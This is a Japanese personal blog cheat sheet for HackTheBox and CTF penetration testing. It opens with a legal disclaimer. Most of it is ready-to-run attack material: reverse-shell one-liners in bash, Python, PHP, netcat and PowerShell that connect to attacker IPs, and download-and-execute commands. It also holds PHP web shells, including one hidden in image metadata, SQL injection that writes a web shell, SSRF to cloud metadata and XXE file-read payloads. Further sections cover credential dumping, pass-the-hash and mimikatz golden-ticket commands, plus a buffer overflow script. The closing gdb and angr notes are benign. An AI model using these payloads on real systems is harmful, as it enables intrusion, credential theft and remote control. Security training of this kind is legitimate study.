---
title: 【個人用】HackTheBox/CTF用のチートシートまとめ(作成中)
date: "2022-06-11"
template: "post"
draft: false
slug: "cheatsheet-main"
category: "HackTheBox"
tags:
  - "HackTheBox"
  - "CheetSheet"
description: "HackTheBox用のチートシートのまとめページ"
socialImage: "/media/cards/no-image.png"
---

個人的に使用しているHackTheBox用のチートシートをまとめました。

**本記事の内容は社会秩序に反する行為を推奨することを目的としたものではございません。**

自身の所有する環境、もしくは許可された環境以外への攻撃の試行は、「不正アクセス行為の禁止等に関する法律（不正アクセス禁止法）」に違反する可能性があること、予めご留意ください。

またすべての発言は所属団体ではなく個人に帰属します。

<!-- omit in toc -->

## もくじ

- [もくじ](#もくじ)
- [使用頻度の高いコマンドまとめ](#使用頻度の高いコマンドまとめ)
  - [攻略開始時(ポートスキャン)](#攻略開始時ポートスキャン)
  - [Webスキャン](#webスキャン)
  - [攻撃ファイル転送](#攻撃ファイル転送)
  - [リバースシェル](#リバースシェル)
- [スキャンツールまとめ](#スキャンツールまとめ)
  - [ポートスキャン](#ポートスキャン)
  - [データベースのスキャン](#データベースのスキャン)
  - [Windows/Sambaシステムのスキャン](#windowssambaシステムのスキャン)
  - [Active Directory環境のスキャン](#active-directory環境のスキャン)
  - [Web脆弱性スキャン](#web脆弱性スキャン)
- [Webエクスプロイトまとめ](#webエクスプロイトまとめ)
  - [Web Shellを使う](#web-shellを使う)
  - [SQL injection](#sql-injection)
  - [XSS](#xss)
  - [XML External Entity(XML外部実体参照)](#xml-external-entityxml外部実体参照)
- [その他のエクスプロイト](#その他のエクスプロイト)
  - [SMB、Active Directoryを悪用したリモートアクセス](#smbactive-directoryを悪用したリモートアクセス)
- [内部探索(Windows)](#内部探索windows)
  - [内部探索のポイント](#内部探索のポイント)
  - [Windowsエクスプロイトの特定](#windowsエクスプロイトの特定)
  - [Windowsユーザ情報、セキュリティ特権の探索](#windowsユーザ情報セキュリティ特権の探索)
  - [UACの変更](#uacの変更)
  - [フォルダ、共有フォルダの権限の探索](#フォルダ共有フォルダの権限の探索)
  - [タスクスケジューラ設定の確認](#タスクスケジューラ設定の確認)
  - [環境変数の確認](#環境変数の確認)
- [特権取得(Windows)](#特権取得windows)
  - [mimikatzでKerberos環境を攻撃する](#mimikatzでkerberos環境を攻撃する)
- [内部探索(Linux)](#内部探索linux)
- [特権取得(Linux)](#特権取得linux)
- [pwnのTips](#pwnのtips)
  - [BOFサンプル](#bofサンプル)
  - [書式文字攻撃サンプル](#書式文字攻撃サンプル)
- [gdbのTips](#gdbのtips)
  - [フラグ置き換え方法](#フラグ置き換え方法)
  - [条件ジャンプ命令メモ](#条件ジャンプ命令メモ)
  - [メモリ読み出しのよく使うやつ](#メモリ読み出しのよく使うやつ)
  - [レジストリ読み出し](#レジストリ読み出し)
  - [変数読み出し](#変数読み出し)
  - [実行時引数 / 標準入出力](#実行時引数--標準入出力)
  - [GDBをPythonで操作する](#gdbをpythonで操作する)
- [angrのサンプル](#angrのサンプル)
  - [Hashcatサンプル](#hashcatサンプル)


## 使用頻度の高いコマンドまとめ

### 攻略開始時(ポートスキャン)

``` bash
# ターゲットマシンのIPをHOSTSに追加して高速スキャン
sudo sed -i 's/^[0-9].*targethost.htb/10.0.0.10  targethost.htb/g' /etc/hosts
nmap -sV -sC -T4 targethost.htb| tee nmap1.txt
rustscan -a targethost.htb --range 1-10000| tee ruststan-fast.txt

# All ports
nmap -p- targethost.htb -Pn -sC -sV -A  | tee nmap_max.txt
```

参考：[nmap - Linux man page](https://linux.die.net/man/1/nmap)

参考：[RustScan | Faster Nmap Scanning with Rust](https://rustscan.github.io/RustScan/#-usage)

### Webスキャン

``` bash
# gobuster 特定のディレクトリ配下をさらに調べたいときは階層を追加する
gobuster dir -u http://targethost.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 40 | tee gobuster.txt

# バックエンドの種類に合わせて変更する
feroxbuster -u http://targethost.htb/ -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt | tee feroxbuster.txt

feroxbuster -u http://targethost.htb/  -x asp,aspx -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt | tee feroxbuster.txt

## --no-recursion
feroxbuster -u http://targethost.htb/ -x php -w /usr/share/wordlists/raft-medium-directories.txt --no-recursion | tee feroxbuster.txt

```

### 攻撃ファイル転送

``` bash
# HTTP/FTPサーバ起動(ホスト側)
cd ~/Hacking/Tools
python3 -m http.server 5000
python3 /home/kali/Hacking/Tools/localftp.py

# ファイルダウンロード(HTTP)
curl "http://10.10.10.7:5000/linpeas.sh" -o "linpeas.sh"
curl "http://10.10.10.7:5000/winPEASx64.exe" -o "winPEASx64.exe"
Invoke-WebRequest "http://10.10.10.7:5000/winPEASx64.exe" -OutFile "winPEASx64.exe"
IEX(New-Object Net.WebClient).downloadstring('http://10.10.10.7:5000/winPEASx64.bat')
certutil.exe -URLCache -split -f http://10.10.14.3:5000/exploit exploit.exe

# ファイルダウンロード(FTP)
echo open 10.10.10.3 > ftp.txt && echo user user password >> ftp.txt && echo get exploit exploit.exe >> ftp.txt && echo quit >> ftp.txt
ftp -n < ftp.txt
```

よく転送するファイル

- [PEASS-ng/linPEAS at master · carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [PEASS-ng/winPEAS at master · carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [rasta-mouse/Sherlock: PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.](https://github.com/rasta-mouse/Sherlock)
  - WinPEASで利用するWatsonによる脆弱性検索はWindowsServer 2016以降でしか動作しないためSherlockを使う場合がある
- [SecWiki/windows-kernel-exploits: その他エクスプロイト](https://github.com/SecWiki/windows-kernel-exploits)
- [AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [windows-binaries | Kali Linux Tools](https://www.kali.org/tools/windows-binaries/)
- [ParrotSec/mimikatz](https://github.com/ParrotSec/mimikatz)

### リバースシェル

``` bash
# ホスト待ち受け
nc -nlvp 4444
sudo tcpdump -i tun0 icmp

# spawn
python3 -c 'import pty; pty.spawn("/bin/bash")'

# よく使うrevshell
# Bash
bash -i >& /dev/tcp/10.10.10.1/4444 0>&1
0<&196;exec 196<>/dev/tcp/10.10.10.1/4444; sh <&196 >&196 2>&196
/bin/bash -l > /dev/tcp/10.10.10.1/4444 0<&1 2>&1

# Python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

# PHP
php -r '$sock=fsockopen("10.10.10.1",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

<?php system($_GET['cmd']); ?>

curl "http://10.10.11.116/webshell.php" --data-urlencode "cmd=bash -c '/bin/bash -l > /dev/tcp/10.10.16.7/4444 0<&1 2>&1'"

# Netcat
nc -e /bin/sh 10.10.10.1 4444
nc.exe -nv 10.10.10.1 4444 -e cmd.exe

# Unix
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f

# PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.1:5000/mini-reverse.ps1')
```

参考：[Reverse Shell Cheat Sheet | pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

参考：[PayloadsAllTheThings/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

参考：[Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

参考：[Reverse Shell Cheat Sheet - OSCP](https://oscp.infosecsanyam.in/shells/reverse-shell-cheat-sheet)

## スキャンツールまとめ

### ポートスキャン

``` bash
# フィルタされたポートの探索
sudo nmap -sU -sT -T4 targethost.htb| tee nmap-filtered.txt

# OS Scan
sudo nmap -p- targethost.htb -Pn -sC -sV -A -O --osscan-guess | tee nmap-os.txt

# IPv6スキャン
nmap -sV -sC -T4 -6 dead:beef:0000:0000:0250:56ff:feb9:ba95 | tee nmap-ipv6.txt

# Rustscan
rustscan --ulimit 5000 -a targethost.htb | tee rustscan.txt
sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g" rustscan.txt > rustscan.txt
```

### データベースのスキャン

``` bash
# MySQL(DB/Table/Data)のダンプ
mysqldump -u USER_NAME -p -h HOST_NAME DB_NAME > OUTPUT_FILE_NAME
mysqldump -u USER_NAME -p -h HOST_NAME DB_NAME TABLE_NAME > OUTPUT_FILE_NAME
mysqldump -u USER_NAME -p -h HOST_NAME -A -n > OUTPUT_FILE_NAME 
```

### Windows/Sambaシステムのスキャン

``` bash
# enum4linux
enum4linux targethost.htb
<!-- 
    -U  get userlist
    -M  get machine list
    -N  get namelist dump (different from -U and-M)
    -S  get sharelist
    -P  get password policy information
    -G  get group and member list
    -A  all of the above (full basic enumeration) -->
    
# SMBの探索
crackmapexec smb targethost.htb
crackmapexec smb targethost.htb -u user-p 'password'

# AD環境 (SMB共有の列挙)
smbmap -H targethost.htb -d Domain -u user -p pass
smbclient -L //targethost.domain/ -U user
```

- ポート139と445が開いている場合はSMBが実行されている可能性が高い。
- ワークグループ名、サーバーがnullセッションを許可するかどうか。システムに存在するユーザーに関する情報を取得できる。
- print $、IPC $、ADMIN $などのデフォルトの共有だけでなく、 optやtmpなどのカスタム共有の情報も取得できる。
- パスワードポリシー、資格情報が取得できる。

参考：[enum4linux | Kali Linux Tools](https://www.kali.org/tools/enum4linux/)

参考：[Enum4linuxとSmbclientを使用してSMBを列挙する方法«ヌルバイト::WonderHowTo](https://null-byte.wonderhowto.com/how-to/enumerate-smb-with-enum4linux-smbclient-0198049/)

参考：[byt3bl33d3r/CrackMapExec: A swiss army knife for pentesting networks](https://github.com/byt3bl33d3r/CrackMapExec)

参考：[ShawnDEvans/smbmap: SMBMap is a handy SMB enumeration tool](https://github.com/ShawnDEvans/smbmap)

### Active Directory環境のスキャン

``` bash
# DomainNameをhostsに追加しておく(enum4linux や Nmap でドメインが特定されている状態で使用)
./kerbrute_linux_386 userenum -t 20 -d domain.local --dc domain.local /usr/share/wordlists/metasploit/unix_users.txt

# impacketのexamples/secretsdump.py(DRSUAPI)によるダンプの取得
python3 examples/secretsdump.py DOMAIN/backup:PASS@10.10.10.0
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::

# impacketのexamples/GetNPUsers.pyによるASREPRoast攻撃
python3 examples/GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

# GetNPUsers.pyの出力はハッシュで返されるので、以下のHashcatで解析できる
hashcat -a 0 -m 18200 ./hash.txt /usr/share/wordlists/rockyou.txt
```

- Kerberosの事前認証を悪用することにより、有効なActiveDirectoryユーザーをブルートフォースおよび列挙することができる。
- ドメインコントローラーのバックアップアカウント(buckup)などの権限を取得した場合、DC内のすべてのアカウントのパスワードハッシュを取得できる可能性がある。
- Ntds.ditファイル（ActiveDirectoryデータを格納するデータベース）を取得できた場合は、mimikatzやHashcatでパスワードを復号できる可能性がある。(DRSUAPIでダンプを取得)
- ASREPRoast は、Kerberos事前認証が必要な属性(DONT_REQ_PREAUTH)を持たないユーザを探し、悪用する攻撃。

参考：[UserAccountControl property flags - Windows Server | Microsoft Docs](https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)

参考：[ASREPRoast - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)

### Web脆弱性スキャン

``` bash
# nikto
nikto --url targethost.htb | tee nikto.txt

# OWASP ZAP
sudo apt install zaproxy -y

# SQL injection scan
python3 sqlmap.py -u "http://targethost.htb/" --data "username=test&country=Ukraine"

# WPScan
wpscan --url http://targethost.htb --enumerate u,cb,m,vp | tee wpscan.txt
```

参考：[sullo/nikto: Nikto web server scanner](https://github.com/sullo/nikto)

参考：[OWASP ZAP – Getting Started](https://www.zaproxy.org/getting-started/)

参考：[sqlmapproject/sqlmap: Automatic SQL injection and database takeover tool](https://github.com/sqlmapproject/sqlmap)

参考：[Second Order SQL injection / UNION injection](/hackthebox-linux-validation#second-order-sql-injection)

参考：[WPScanを使ってWordpressをスキャンする - Qiita](https://qiita.com/koujimatsuda11/items/d49e8642dea1a1b0d067)

## Webエクスプロイトまとめ

### Web Shellを使う

``` bash
# PHPを埋め込める場合
<?php SYSTEM($_REQUEST['cmd']); ?>

# exiftoolで埋め込む場合
exiftool -documentname='<?php system($_GET['cmd']); ?>' test.jpg
mv test.jpg test.php.jpg

# Shellを呼び出す
curl -G --data-urlencode "cmd=bash -c '/bin/bash -l > /dev/tcp/10.10.10.2/4444 0<&1 2>&1'" http://target.htb/test.php.jpg | cat
```

参考：[File Upload Filter Bypass: exiftoolを使って画像ファイルにphpスクリプトを埋め込む](/hackthebox-linux-networked#exiftool%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%ABphp%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E3%82%92%E5%9F%8B%E3%82%81%E8%BE%BC%E3%82%80)

### SQL injection

``` sql
-- SQL injection scan
-- python3 sqlmap.py -u "http://targethost.htb/" --data "username=test&country=Ukraine"

-- DBのユーザ名を表示
select user()

-- DB名
select database()

-- DS列挙
select schema_name from information_schema.schemata

-- テーブル取得
select table_name from information_schema.tables where table_schema = '<table name>'

-- テーブル情報取得
select column_name from information_schema.columns where table_name = '<table name>'

-- テーブル情報特定(複文)
;SELECT null,tablename,null,null,null,null,null FROM pg_tables WHERE tablename LIKE '%ar%'--
;SELECT null,tablename,null,null,null,null,null FROM pg_tables LIMIT 1 OFFSET 6;--

-- カラム特定（複文）
;SELECT null,column_name,null,null,null,null,null FROM information_schema.columns WHERE table_name='news_subscriber' AND column_name LIKE '%ex%'　--
;SELECT null,column_name,null,null,null,null,null FROM information_schema.columns LIMIT 1 OFFSET 6;--

-- ユーザの権限参照
select privilege_type FROM information_schema.user_privileges where grantee = "<username>"

-- ファイルへの書き込み（ユーザにFILE権限が存在する場合のみ実行可能）
select "Test" into outfile '/var/www/html/Test.txt'

-- WEBシェルの書き込み
select "<?php SYSTEM($_REQUEST['cmd']); ?>" into outfile '/var/www/html/webshell.php'

-- UNION injection の動作確認(コメントアウト後に必ずクローズを入れること)
' UNION SELECT 1;-- -';

-- DBのユーザ名を表示（UNION Injection）
' union select user();-- -';
```

- 入力フォームからのinputにSQLiの脆弱性が見つからない場合でも、`Second Order SQL injection`やマルチバイト文字を利用した攻撃方法が存在する可能性がある。
  - [今夜分かるSQLインジェクション対策：Security&Trust ウォッチ（42） - ＠IT](https://atmarkit.itmedia.co.jp/ait/articles/0611/02/news127.html)

参考：[SQL Injection Cheat Sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections)

参考：[PentesterLab: Learn Web App Pentesting!](https://pentesterlab.com/exercises/from_sqli_to_shell_pg_edition/course)

### XSS

`AWS meta-data`攻撃のサンプル

``` javascript
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
    if (xmlhttp.readyState == XMLHttpRequest.DONE && xmlhttp.status == 200) {
        console.log("got resp");
        document.body.style.backgroundImage='none';
        var main = document.getElementById("main");
        main.innerHTML = xmlhttp.responseText;
    }
}

xmlhttp.open("POST", "/fetch", true);
xmlhttp.send("http://169.254.169.254/latest/meta-data/");

xmlhttp.open("POST", "/fetch", true);
xmlhttp.send("http://169.254.169.254/latest/meta-data/hostname");

xmlhttp.open("POST", "/fetch", true);
xmlhttp.send("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info");
```

`Local file injection`攻撃のサンプル

``` bash
var xmlhttp = new XMLHttpRequest();
	xmlhttp.onreadystatechange = function () {
    if (xmlhttp.readyState == XMLHttpRequest.DONE && xmlhttp.status == 200) {
        var output = document.getElementById("output")
        output.style.visibility = "visible";
        var resp = JSON.parse(xmlhttp.responseText);
        document.getElementById("collapsible").checked = false;
        document.getElementById("ver").innerHTML = resp['http_ver'];
        document.getElementById("code").innerHTML = resp['code'];
        document.getElementById("server").innerHTML = resp['server'];
        document.getElementById("date").innerHTML = resp['date'];
        document.getElementById("httpresponse").innerHTML = escape(resp['raw']);

    }
}
xmlhttp.open("POST", "/scan", true);
xmlhttp.send("file:///etc/passwd");
xmlhttp.send("file:///home/min/user.txt");
```

### XML External Entity(XML外部実体参照)

XXEを悪用することで、サーバ内のファイルの取得や情報収集、SSRF攻撃など様々な攻撃に利用できる。

`<!ENTITY`を用いることで実体参照を呼び出すことができ、文字列の置換や、外部ファイルの内容を埋め込む。

そのため、XMLを送り込むことができる場合には、XXEを試すとよい。

``` xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file://etc/passwd" >]>

   # PHPの場合 
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">] >
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php">] >
<foo>&xxe;</foo>
```

参考：[XXE(XML外部実体参照)](/hackthebox-linux-bugbountyhunter#xxexml%E5%A4%96%E9%83%A8%E5%AE%9F%E4%BD%93%E5%8F%82%E7%85%A7)

## その他のエクスプロイト

### SMB、Active Directoryを悪用したリモートアクセス

``` bash
# evil-winrm
evil-winrm -i targethost.htb　-u user -p 'password'

# Pass The Hashでリモートアクセス(-Hオプションによりパスワード無しで侵入できる)
evil-winrm -i targethost.htb　-u Administrator -H 'NTLM hash'
```

参考：[Hackplayers/evil-winrm: The ultimate WinRM shell for hacking/pentesting](https://github.com/Hackplayers/evil-winrm)

参考：[Evil-WinRMを使ったWindows OS環境のリモート探索 - Qiita](https://qiita.com/v_avenger/items/78b323d5e30276a20735)

参考：[SambaでほかのLinuxにアクセスするには](https://atmarkit.itmedia.co.jp/flinux/rensai/linuxtips/193smbclientuse.html)



## 内部探索(Windows)

### 内部探索のポイント

- `[Environment]::Is64BitProcess`で現在稼働しているプロセスのbit数を取得する
- 認証情報の探索
  - 設定情報が記載されたconfigファイル
  - 認証情報が格納されたデータベースのダンプ
  - 認証情報が平文で書き込まれているアクセスログ
  - 過去の認証情報が記録されたバックアップファイルやシャドウコピー
  - 隠しフォルダ(FTPのdirコマンドでは隠しフォルダは表示されない)
- 資格情報のキャプチャ
  - [プリンタデバイスとのLDAP通信のキャプチャ](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)

参考：[PowerShellのセッション](/hackthebox-windows-optimum#powershell%E3%81%AE%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3)

### Windowsエクスプロイトの特定

``` bash
# windows-exploit-suggesterにsysteminfoを与えて探索(Python2/xlrd==1.1.0が必要)
pip install xlrd==1.1.0
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database 2022-06-05-mssb.xls --systeminfo systeminfo.txt
```

### Windowsユーザ情報、セキュリティ特権の探索

``` bash
# ユーザ情報
net user
net user Administrator

# プロセスのトークンのユーザが保有するセキュリティ特権の一覧
whoami /priv

# ユーザとドメインの確認
lusrmgr.msc
```

参考：[Poc’ing Beyond Domain Admin - Part 1 - \cube0x0\](https://cube0x0.github.io/Pocing-Beyond-DA/)

### UACの変更

``` bash
UserAccountControlSettings.exe
```

### フォルダ、共有フォルダの権限の探索

``` bash
icacls でアクセス許可を確認

#I-親コンテナから継承された権限
#F-フルアクセス（フルコントロール）
#M-権利/アクセスを変更する
#OI-オブジェクト継承
#IO-継承のみ
#CI-コンテナ継承
#RX-読み取りと実行
#AD-データを追加します（サブディレクトリを追加します）
#WD-データの書き込みとファイルの追可
```

### タスクスケジューラ設定の確認



### 環境変数の確認





## 特権取得(Windows)

### mimikatzでKerberos環境を攻撃する

``` bash
# mimikatz.exe
# .kirbiチケットのエクスポート
sekurlsa::tickets /export
# チケットの偽装
kerberos::ptt <ticket>

# ========================================================
# mimikatz.exe
# ゴールデンチケットの作成に必要なハッシュとセキュリティ識別子のダンプ
lsadump::lsa /inject /name:krbtgt

# ゴールデンチケットを作成してシルバーチケットを作成するためのコマンド
# サービスNTLMハッシュをkrbtgtスロットに入れ、サービスアカウントのsidをsidに入れ、idを1103に変更する
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:

# mimikatzで指定されたチケットを使用して新しい昇格されたコマンドプロンプトを起動
misc::cmd
```

- マシンのLSASSメモリからTGTをダンプすることにより、チケットを取得し、偽装することができる。
- ドメインのSQLサーバーにアクセスしたいが、現在侵害されているユーザーはそのサーバーにアクセスできないとき、そのサービスをkerberoastingすることで、足がかりを得るためのアクセス可能なサービスアカウントを見つけることができる。次に、サービスハッシュをダンプし、TGTになりすまして、KDCからSQLサービスのサービスチケットを要求し、ドメインのSQLにアクセスできるようにする。



## 内部探索(Linux)

- rootとuserのcrontabを確認する
- `sudo -l`の出力を確認する
- 認証情報の探索
  - 設定情報が記載されたconfigファイル
  - 認証情報が格納されたデータベースのダンプ
  - 認証情報が平文で書き込まれているアクセスログ
  - 過去の認証情報が記録されたバックアップファイルやシャドウコピー
- マウントされたフラッシュディスクのデータをサルベージする
  - [USB メモリからのデータのサルベージ](https://kashiwaba-yuki.com/hackthebox-linux-mirai)



## 特権取得(Linux)

(工事中)

## pwnのTips

### BOFサンプル

``` python
from pwn import *
import binascii
import time

elf = ELF("./chall")
context.binary = elf

nopsled = b"\x41"*72
payload = nopsled

# Local
p = process("./chall")

# Remote
p = remote("bof.pwn.wanictf.org", 9002)

r = p.recv()
r = p.recvline()
p.sendline(payload)
p.interactive()

# shellcode = p64(0xc6a8b9f731892800)
# p.sendline(payload)
# p.sendline(b"A"*72 + b"%08x."*20)

# r = p.recvline()
# shellcode = p64(int(r.strip(), 0x10))
# shellcode2 = p64(0x4011db)
# p.sendline(payload + shellcode + b'\x41'*8 + shellcode2)
```

### 書式文字攻撃サンプル

``` bash
// スタックの中身を表示
AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x

// 10番目の値を表示
AAAA%10$08x

// netcatで書式文字攻撃
python3 -c 'print("1\n" + "%p." * 50)' | nc mercury.picoctf.net 20195 | tr "." "\n" | while read line; do echo $line | xxd -r -p | strings -n1 | rev; done | tr -d "\n"
```

## gdbのTips

### フラグ置き換え方法

``` bash
# Toggle Flag
info registers eflags
set $CF = 0
set $PF = 2
set $ZF = 6
set $SF = 7

set $eflags ^= (1 << $SF)
set $eflags ^= (1 << $ZF)
set $eflags ^= (1 << $CF)

# Set flag
eflags [ IF ]
set $eflags = 0x42

eflags [ IF ] 
set $eflags = 0

eflags [ CF PF AF ZF SF TF IF DF OF NT RF AC ] 
set $eflags = 0xFFFFF

## Clear Flag
set $eflags &= ~(1 << $ZF)
```

### 条件ジャンプ命令メモ

``` bash
命令	ジャンプ条件
JA	より上（CF = 0 & ZF = 0）  77
JAE	より上か等しい（CF = 0）
JB	より下（CF = 1）  72
JBE	より下か等しい（CF = 1 | ZF = 1）
JC	キャリーがある（CF = 1）
JCXZ	CXレジスタが0
JE	等しい(ZF = 1）  74
JG	より大きい（ZF = 0 & SF = OF）
JGE	より大きいか等しい（SD = OF）
JL	より小さい（SF ! OF）
JLE	より小さいか等しい（ZF = 1 | SF ! OF）
JNA	より上でない（CF = 1 | ZF = 1）
JNAE	より上でなく等しい（CF = 1）
JNB	より下でない（CF = 0）
JNBE	より下でなく等しい（CF = 0 & ZF = 0）
JNC	キャリーがない（CF = 0）
JNE	等しくない(ZF = 0） 75
JNG	より大きくない（ZF = 1 | SF ! OF）
JNGE	より大きくなく等しくない（SF ! OF）
JNL	より小さくない（SF = OF）
JNLE	より小さくなく等しくない(ZF = 0 & SF = OF）
JNO	オーバーフローがない（OF = 0）
JNP	パリティがない（PF = 0）
JNS	符号がない（SF = 0）
JNZ	ゼロではない（ZF = 0）
JO	オーバーフローがある（PF = 1）
JP	パリティがある（PF = 1）
JPE	パリティが偶数(PF = 1）
JPO	パリティが基数(PF = 0）
JS	符合がある(SF = 1）
JZ	ゼロである(ZF = 1）

[インラインアセンブラで学ぶアセンブリ言語 第3回 (1/3)：CodeZine（コードジン）](https://codezine.jp/article/detail/485)
```

### メモリ読み出しのよく使うやつ

``` bash
x/5i $rip
x/5i $rbp-0x1c
x /s
x /16
x/40c $rax+$rdx*1
```

### レジストリ読み出し

``` bash
info registers eflags

xinfo register edx
```

### 変数読み出し

``` bash
# 現在のフレームのローカル変巣
info locals

# 特定の変数の値を出力
p param

# 特定の変数の書き換え
set var param = "Hello world!"
set {char}0x5555555592a0 = 0x20

# 現在のフレームの引数の一覧
info args

# 特定の変数の変更の追跡
display param
undisplay

# 特定の変数の変更時にブレーク
watch param
```

### 実行時引数 / 標準入出力

``` bash
# 実行
run

# コマンドライン引数付きで実行
run arg1

# 標準入力(ファイルで指定可能)
run < inputfile

# 標準出力(ファイルで指定可能)
run > outputfile
```

### GDBをPythonで操作する

``` python
# gdb -x run.py
import gdb

BINDIR = "/home/parrot/Downloads"
BIN = "gombalab"
INPUT = "./in.txt"
OUT = "./out.txt"
BREAK = "0x4a09f9"

gdb.execute('file {}/{}'.format(BINDIR, BIN))
gdb.execute('b *{}'.format(BREAK))

# 引数を変えてループ実行
for i in range(128):
    with open(INPUT, "w") as f:
        f.write("A"*i)
    gdb.execute('run < {}'.format(INPUT, OUT))

# 特定のメモリアドレスの値の書き換え
seed = "rgUAvvyfyApNPEYg"
for i, c in enumerate(seed):
    target = hex(0x5555555592a0 + i)
    print('set {}{} = {}'.format("{char}", target, hex(ord(c))))
    gdb.execute('set {}{} = {}'.format("{char}", target, hex(ord(c))))
    
# メモリの値をバイト形式で取得
i = gdb.inferiors()[0]
mem = i.read_memory(0x7fffffffdaa0, 264)
base = mem.tobytes()
print(base)

gdb.execute('quit')
```

## angrのサンプル

``` python
import angr
import monkeyhex
import pprint

proj = angr.Project("licence.exe", auto_load_libs=False)

"""
pipenv shell
pip install angr
pip install monkeyhex
"""

#######################################################
# First
#######################################################
"""
print("ARCH", proj.arch)
print("EntryPoint", proj.entry)
print("FileName", proj.filename)
"""

#######################################################
# Loader
#######################################################
"""
print("Loader", proj.loader)
print("LoaderShareObj", proj.loader.shared_objects)
print("MinAddr", proj.loader.min_addr)
print("MaxAddr", proj.loader.max_addr)
print("ExeStack", proj.loader.main_object.execstack)
print("Pic", proj.loader.main_object.pic)
"""

#######################################################
# entry point
#######################################################
"""
block = proj.factory.block(proj.entry)
print(block.pp())
print("Instructions", block.instructions)
print("Instruction Addrs", block.instruction_addrs)

print("Capstone", block.capstone)
print("Vex", block.vex)
"""

#######################################################
# Analyses
#######################################################
"""
proj.analyses.BackwardSlice        proj.analyses.CongruencyCheck      proj.analyses.reload_analyses       
proj.analyses.BinaryOptimizer      proj.analyses.DDG                  proj.analyses.StaticHooker          
proj.analyses.BinDiff              proj.analyses.DFG                  proj.analyses.VariableRecovery      
proj.analyses.BoyScout             proj.analyses.Disassembly          proj.analyses.VariableRecoveryFast  
proj.analyses.CDG                  proj.analyses.GirlScout            proj.analyses.Veritesting           
proj.analyses.CFG                  proj.analyses.Identifier           proj.analyses.VFG                   
proj.analyses.CFGEmulated          proj.analyses.LoopFinder           proj.analyses.VSA_DDG               
proj.analyses.CFGFast              proj.analyses.Reassembler
"""

cfg = proj.analyses.CFGFast()
graph = cfg.graph
entry_node = cfg.get_any_node(proj.entry)
# print("Graph Nodes", len(cfg.graph.nodes()))
# print("Graph Entry Nodes", len(list(cfg.graph.successors(entry_node))))

#######################################################
# Main
#######################################################
obj = proj.loader.main_object
print("Entry", hex(obj.entry))
print("Min Addr", hex(obj.min_addr))
print("Max Addr", hex(obj.max_addr))

addr = obj.plt["strcmp"]
print("strcmp addr", addr)

# print_good = 0x405e6d
# avoid_addr = [0x405ceb, 0x405d2f, 0x405d62, 0x405d8f, 0x405dc2, 0x405de8, 0x405e1e, 0x405e4b]

# create project
proj = angr.Project('licence.exe')

# initial_state at the entry point of the binary
init_state = proj.factory.entry_state(args = ['licence.exe', 'key.dat'])

# create simulation
simgr = proj.factory.simgr(init_state)

simgr.explore(find=(0x405e57), avoid=(0x405e86))
if len(simgr.found) > 0:
    print(simgr.found[0].posix.dumps(0))
    print(simgr.found[0].posix.dumps(1))
    for results in simgr.found:
        print(results.posix.dumps(3))
```

